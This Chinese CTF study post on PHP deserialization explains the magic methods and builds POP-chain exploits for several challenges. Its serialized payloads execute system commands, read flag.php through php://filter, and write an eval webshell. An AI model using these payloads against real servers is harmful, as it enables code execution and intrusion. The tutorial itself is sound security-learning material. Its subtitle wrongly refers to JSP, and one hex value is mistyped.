---
layout:     post            # 使用的布局（不需要改）
title:      Web笔记（十九）php反序列化-POP链   # 标题
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是jsp两个常见漏洞类型的学习，只记录了一点皮毛，学习如何使用工具去利用，没有深入理论研究漏洞原理。  # 副标题
date:       2021-10-27
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - php
    - 漏洞利用
---


## 0x00 序列化与反序列化

- 序列化就是将对象转换成字符串

- 反序列化就是将特定格式的字符串转换成对象

*反序列化漏洞*：
也称为PHP对象注入，是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控后果。Java、Python也存在反序列化漏洞，原理类似。

## 0x01 PHP魔术方法
- `__construct`：构造函数，在创建对象时初始化对象，一般用于赋初值
- `__destruct`：析构函数，当对象所在函数调用完毕后执行
- `__call`：当调用对象中不存在的方法会自动调用该方法
- `__get`：获取对象中不存在的属性时执行此方法
- `__set`：设置对象中不存在的属性时执行此方法
- `__toString`：当对象被当做一个字符串使用时调用
- `__sleep`：序列化对象之前调用（其返回需要一个数组）
- `__wakeup`：反序列化恢复对象之前调用该方法
- `__isset`：在不可访问的属性上调用`issest()`或`empty()`触发
- `__unset`：在不可访问的属性上调用`unset()`时触发
- `__invoke`：将对象当做函数来使用时执行此方法

#### 1. \_\_construct & \_\_destruct
- `__construct`：构造函数，在创建对象时初始化对象，一般用于赋初值
- `__destruct`：析构函数，当对象所在函数调用完毕后执行
```php
<?php
class Test{
    public $name;
    public $age;
    public $string;
    // __construct：实例化对象时被调用，初始化值。
    public function __construct($name, $age, $string){
        echo "__construct 初始化"."\n";
        $this->name = $name;
        $this->age = $age;
        $this->string = $string;
    }
    // __destruct：删除对象或对象操作终止时被调用，做垃圾回收。
    /*
     * 当对象销毁时会调用此方法
     * 一是用户主动销毁对象，二是当程序结束时由引擎自动销毁
     */
    function __destruct(){
       echo "__destruct 类执行完毕"."\n";
    }
}
// 主动销毁
$test = new Test("Spaceman",123, "Test String");
unset($test);
// 主动销毁先执行__destruct再执行下面的echo
echo "123"."\n";
echo "----------------------\n";
// 程序结束自动销毁
$test = new test("Spaceman",456, "Test String");
// 自动销毁先执行下面的echo，程序结束才执行__destruct
echo "456"."\n";
?>
```
运行结果：
```shell
__construct 初始化
__destruct 类执行完毕
123
----------------------
__construct 初始化
456
__destruct 类执行完毕
```


#### 2. \_\_call
- `__call`：当调用对象中不存在的方法会自动调用该方法
```php
<?php
class Test{
    public function good($number, $string){
        echo "存在good方法"."\n";
        echo $number."---------".$string."\n";
    }

    // 当调用类中不存在的方法时，就会调用__call();
    public function __call($method, $args){
        echo "不存在".$method."方法"."\n";
        var_dump($args);
    }
}

$a = new Test();
$a->good(123,"nice");
$b = new Test();
$b->spaceman(456,"no");
?>
```
运行结果：
```shell
存在good方法
123---------nice
不存在spaceman方法
array(2) {
  [0]=>
  int(456)
  [1]=>
  string(2) "no"
}
```

#### 3. \_\_get & \_\_set
- `__get`：获取对象中不存在的属性时执行此方法
- `__set`：设置对象中不存在的属性时执行此方法
```php
<?php
class Person{
    private $name;
    private $sex;
    private $age;

    //__get()方法用来获取私有属性
    public function __get($property_name){
        echo "在直接获取私有属性值的时候，自动调用了这个__get()方法\n";
        if(isset($this->$property_name)) {
            return($this->$property_name);
        }
        else {
            return(NULL);
        }
    }

    // __set()方法用来设置私有属性
    public function __set($property_name, $value){
        echo "在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值\n";
        $this->$property_name = $value;
    }
}

$a = new Person();
// 直接为私有属性赋值的操作，会自动调用__set()方法进行赋值
$a->name="张三";
$a->sex="男";
$a->age=20;
// 直接获取私有属性的值，会自动调用__get()方法，返回成员属性的值
echo "姓名：".$a->name."\n";
echo "性别：".$a->sex."\n";
echo "年龄：".$a->age."\n";
?>
```
运行结果：
```shell
在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值
在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值
在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值
在直接获取私有属性值的时候，自动调用了这个__get()方法
姓名：张三
在直接获取私有属性值的时候，自动调用了这个__get()方法
性别：男
在直接获取私有属性值的时候，自动调用了这个__get()方法
年龄：20
```

#### 4. \_\_toString
- `__toString`：当对象被当做一个字符串使用时调用
```php
<?php
class Test
{
    public $variable = 'This is a string';

    public function good(){
        echo $this->variable . "\n";
    }

    // 在对象当做字符串的时候会被调用
    public function __toString(){
        return "__toString \n";
    }
}

$a = new Test();
$a->good();
echo $a;
?>
```
运行结果：
```shell
This is a string
__toString
```

#### 5. \_\_sleep
- `__sleep`：序列化对象之前调用（其返回需要一个数组）
```php
<?php
class Test{
    public $name;
    public $age;
    public $string;

    // __construct：实例化对象时被调用.其作用是拿来初始化一些值。
    public function __construct($name, $age, $string){
        echo "__construct 初始化"."\n";
        $this->name = $name;
        $this->age = $age;
        $this->string = $string;
    }

    //  __sleep() ：serialize之前被调用，可以指定要序列化的对象属性
    public function __sleep(){
        echo "当在类外部使用serialize()时会调用这里的__sleep()方法\n";
        // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值
        return array('name', 'age');
    }
}

$a = new Test("Spaceman", 123, 'Test String');
echo serialize($a);
?>
```
运行结果：
```shell
__construct 初始化
当在类外部使用serialize()时会调用这里的__sleep()方法
O:4:"Test":2:{s:4:"name";s:8:"Spaceman";s:3:"age";i:123;}
```

#### 6. \_\_wakeup
- `__wakeup`：反序列化恢复对象之前调用该方法
```php
<?php
class Test{
    public $sex;
    public $name;
    public $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    public function __wakeup(){
        echo "当在类外部使用unserialize()时会调用这里的__wakeup()方法\n";
        $this->age = 123;
    }
}

$person = new Test('spaceman',456,'男');
$a = serialize($person);
echo $a."\n";
var_dump (unserialize($a));
?>
```
运行结果：
```shell
O:4:"Test":3:{s:3:"sex";s:3:"男";s:4:"name";s:8:"spaceman";s:3:"age";i:456;}
当在类外部使用unserialize()时会调用这里的__wakeup()方法
object(Test)#2 (3) {
  ["sex"]=>
  string(3) "男"
  ["name"]=>
  string(8) "spaceman"
  ["age"]=>
  int(123)
}
```

#### 7. \_\_isset
- `__isset`：在不可访问的属性上调用`issest()`或`empty()`触发
```php
<?php
class Person{
    public $sex;
    private $name;
    private $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。
    public function __isset($content){
        echo "当在类外部使用isset()函数测定私有成员 {$content} 时，自动调用\n";
        return isset($this->$content);
    }
}

$person = new Person("spaceman", 123,'男');
// public 成员
echo ($person->sex),"\n";
// private 成员
echo isset($person->name);
?>
```
运行结果：
```shell
男
当在类外部使用isset()函数测定私有成员 name 时，自动调用
1
```

#### 8. \_\_unset
- `__unset`：在不可访问的属性上调用`unset()`时触发
unset删除对象的公有属性，但删除不到私有属性，故会调用\_\_unset方法。
```php
<?php
class Person{
    public $sex;
    private $name;
    private $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    // __unset()：销毁对象的某个属性时执行此函数
    public function __unset($content) {
        echo "当在类外部使用unset()函数来删除私有成员时自动调用的\n";
        echo isset($this->$content)."\n";
    }
}

$person = new Person("spaceman", 123, "男"); // 初始赋值
unset($person->sex);
echo "-------------\n";
unset($person->name);
unset($person->age);
?>
```
运行结果：
```shell
-------------
当在类外部使用unset()函数来删除私有成员时自动调用的
1
当在类外部使用unset()函数来删除私有成员时自动调用的
1
```

#### 9. \_\_invoke
- `__invoke`：将对象当做函数来使用时执行此方法
```php
<?php

class Test{
    // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用
    public function __invoke($param1, $param2, $param3)
{
        echo "这是一个对象\n";
        var_dump($param1, $param2, $param3);
    }
}

$a  = new Test();
$a('spaceman', 123, '男');
?>
```
运行结果：
```
这是一个对象
string(8) "spaceman"
int(123)
string(3) "男"
```

#### 10. 注意
需要注意的是类的成员变量可能为public，private，protected。
- public的成员变量：正常序列化`O:3:"pop":1:{s:3:"Pub";s:8:"spaceman";}`
- private的成员变量： 序列化后会在变量名字符串里，加两个不可见字符00夹带类名（打不出不可见字符所以用`%00`代替），`O:3:"pop":1:{s:3:"%00pop%00Pub";s:8:"spaceman";}`
- protected的成员变量：序列化后会在变量名字符串里，加两个不可见字符00夹带星3（打不出不可见字符所以用`%00`代替），`O:3:"pop":1:{s:3:"%00*%00Pub";s:8:"spaceman";}`


## 0x02 pop链利用
#### 1. 示例1
需要GET请求带参数s
```php
<?php

highlight_file(__FILE__);

class pop {
    public $ClassObj;

    // 对象实例化时调用
    function __construct() {
        $this->ClassObj = new hello();
    }

    // 对象销毁或程序运行结束时调用
    function __destruct() {
        $this->ClassObj->action();
    }
}

class hello {
    function action() {
        echo "<br> hello pop ";
    }
}

class shell {
    public $data;
    function action() {
        eval($this->data);
    }
}

$a = new pop();
unserialize($_GET['s']);
```
本地用phpStudy搭建了php网站，并把上述内容保存在test.php中，放在网站根目录下，这样可以访问。

代码中`pop`类的成员变量`$ClassObj`可以传入类对象，但类对象必须包含一个`action`方法，以便在对象析构时`__destruct`方法可以调用。

而`shell`类正好有此方法，该方法执行了eval函数且变量可控，因此构造pop链如下代码：
```php
<?php
class pop {
    public $ClassObj;
}

class shell {
    public $data;
}

$a = new pop();
$a->ClassObj = new shell();
$a->ClassObj->data = "system('dir');";  // 这里输入要执行的命令
echo serialize($a);
?>
```
运行结果：
```
O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:14:"system('dir');";}}
```
构造url：http://127.0.0.1/test.php?s=O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:14:"system('dir');";}} 即可看到返回结果为目录。

#### 2. 示例2 BUUCTF WEB题 \[MRCTF2020\]Ezpop
题目源码：
```php

<?php

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```
分析过程不细说，大概说一下思路：
- 首先是需要反序列化GET请求的`pop`参数，可以看到`__wakeup`方法，一般这里是入口点，顺带看一下出口的话应该是`Modifier`类的`append`方法，可以文件包含；
- 接着看到`__wakeup`中过滤了很多协议，但是注意`php://filter`没有过滤，这里没有什么思路，所以反向思考一下；
- 从出口溯源，`append`方法可以通过`Modifier`类的`__invoke`来调用，那么就需要某个地方实例化一个`Modifier`类对象，然后把这个对象当做函数使用；
- 继续溯源可以发现在`Test`类中`__get`方法将成员变量当做函数使用，那我们可以让成员变量初始化为`Modifier`类对象，接着需要找到在哪里可以实例化`Test`类，并且调用了`Test`类不存在的成员变量，来触发`__get`；
- 溯源可以发现`Show`类中的`__toString`方法调用了成员变量`$str`的`source`变量，可以将`$str`赋值为`Test`类对象，这样就相当于调用了`Test`类不存在的方法`source`，即可触发`__get`，那在哪里可以触发`__toString`呢；
- 回到第二步，我们可以在`Show`的构造函数中，将对象传入给`$source`变量，这样在`__wakeup`的时候需要`$source`作为字符串做正则，就会将对象转为字符串，从而触发`__toString`方法。

生成payload的代码如下：
```php

<?php
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
}
class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}
$b = new Show('anything');
$b->str = new Test();
$c = new Show($b);
echo serialize($c);
echo "\n";
echo urlencode(serialize($c));
echo "\n";
?>
```
修改`Modifier`类的变量`$var`的值即可文件包含，运行结果如下：
```shell
O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:8:"anything";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"<0x00>*<0x00>var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22anything%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```
注意：由于字符00不可见，所以这里用`<0x00>`代替，将上述url编码部分作为GET请求pop参数发送即可。


#### 3. 示例3 ctfshow 反序列化web261
这题目在ctfshow是需要VIP的。。所以这里是参考附链文章提供的源码做的。
源码如下：
```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```
这里有几个知识点，
- `file_put_contents`是写文件函数，第一个参数输入文件名，第二个参数输入文件内容；
- `__wakeup` 和 `__unserialize`都存在时，`__wakeup`会失效；
- `__unserialize`方法带来在反序列化的时用到。
- php弱类型比较`==`，可以用`877.php == 0x3d`使条件成立。
分析了思路，其实要用到的魔术方法不多；不需要`__invoke`、`__sleep`等参数，攻击代码如下：
```php
<?php

class ctfshowvip{
    public $username;
    public $password;
    public function __construct($u, $p){
        $this->username=$u;
        $this->password=$p;
    }
}
$a = new ctfshowvip('877.php', '<?php eval($_GET[x]);?>');
echo serialize($a);
?>
```
运行结果：
```shell
O:10:"ctfshowvip":2:{s:8:"username";s:7:"877.php";s:8:"password";s:23:"<?php eval($_GET[x]);?>";}
```


#### 4. 示例4 2021蓝帽杯半决赛-杰克与肉丝
也是没有找到环境，自己用源码+phpStudy搭建一个，源码如下：
```php
<?php
highlight_file(__file__);     
class Jack    
{
    private $action;    
    function __set($a, $b)
{
        $b->$a();
    }
}
class Love {
    public $var;
    function __call($a,$b)
{
        $rose = $this->var;
        call_user_func($rose);
    }
    private function action(){
        echo "jack love rose";
    }
}
class Titanic{
    public $people;
    public $ship;
    function __destruct(){
        $this->people->action=$this->ship;
    }
}
class Rose{
    public $var1;
    public $var2;
    function __invoke(){
        //if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
            eval($this->var1);
        //}
    }
}
if(isset($_GET['love'])){
    $sail=$_GET['love'];
    unserialize($sail);
}
?>
```
这里注释掉if语句，因为它会干扰传值，需要想其他办法绕过，方便学习就将此省略。
分析思路如下：
- 从出口溯源，出口函数为`eval`，在`Rose`类的`__invoke`方法里，因此需要找到能将`Rose`类对象当做函数执行的代码；
- 溯源发现`Love`类`__call`方法有个函数`call_user_func()`，这个函数是将传入的对象当做函数调用，正好符合；
- 继续溯源则需要某个地方实例化`Love`类，并调用该类对象不存在的方法，来触发`__call`，发现`Jack`类的`__set`方法中有形如`$a()`的结构，正好可以利用；
- 那此时就需要某个地方实例化`Jack`类，并将赋值给`Jack`类对象一个不存在的成员变量，这样就可以触发`__set`方法了，而对某个变量赋值操作的结构可以在`Titanic`类的`__destruct`方法中找到，且如果`$people`赋值了`Jack`类对象，那么`$this->people->action`就正好是不存在的成员变量，因为`Jack`类的`action`方法为私有的，没有公有的`action`方法就相当于不存在。
- 另外，`__destruct`方法是在对象销毁时执行，也就是只要代码运行完，就必定会触发，符合反序列化漏洞利用过程。

生成payload的源码如下：
```php
<?php
class Jack    
{
    private $action;    
    function __set($a, $b){
        $b->$a();
    }
}
class Love {
    public $var;
    function __call($a,$b){
        $rose = $this->var;
        call_user_func($rose);
    }
    private function action(){
        echo "jack love rose";
    }
}
class Titanic{
    public $people;
    public $ship;
    function __destruct(){
        $this->people->action=$this->ship;
    }
}
class Rose{
    public $var1;
    public $var2;
    function __invoke(){
        //if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
            eval($this->var1);
        //}
    }
}

$a = new Rose();
$a->var1 = 'system("dir");';    //这里修改命令
$b = new Love();
$b->var = $a;
$c = new Jack();
// $c->action = $b;

$t = new Titanic();
$t->people = $c;
$t->ship = $b;
echo urlencode(serialize($t));

// 测试Rose类命令执行
// $a = new Rose();
// $a->var1 = 'system("dir");';
// echo $a();
?>
```
注意运行结果包含 private 成员变量的序列化，所以需要urlencode编码转换，或者自己抓包改成%00。
```shell
O%3A7%3A%22Titanic%22%3A2%3A%7Bs%3A6%3A%22people%22%3BO%3A4%3A%22Jack%22%3A1%3A%7Bs%3A12%3A%22%00Jack%00action%22%3BN%3B%7Ds%3A4%3A%22ship%22%3BO%3A4%3A%22Love%22%3A1%3A%7Bs%3A3%3A%22var%22%3BO%3A4%3A%22Rose%22%3A2%3A%7Bs%3A4%3A%22var1%22%3Bs%3A14%3A%22system%28%22dir%22%29%3B%22%3Bs%3A4%3A%22var2%22%3BN%3B%7D%7D%7D
```

## 0x03 总结
- 从入口和出口点出发，逐步溯源，直到构成POP利用链。
- 优先关注一些常出现反序列化漏洞的魔术方法和函数，如`__destruct`、`__wakeup`、`__call`、`__invoke`、`__toString`、`__get`、`__set`、`eval()`、`call_func_user()`、`include()`等。
- 注意protected、private、public成员变量序列化的区别。


## 0xff 参考

[经验分享 | PHP-反序列化（超细的）](https://mp.weixin.qq.com/s/qwYTWPi1KXebl4XAaHAS0w)
[PHP反序列化漏洞——漏洞原理及防御措施](https://blog.csdn.net/cldimd/article/details/104999404)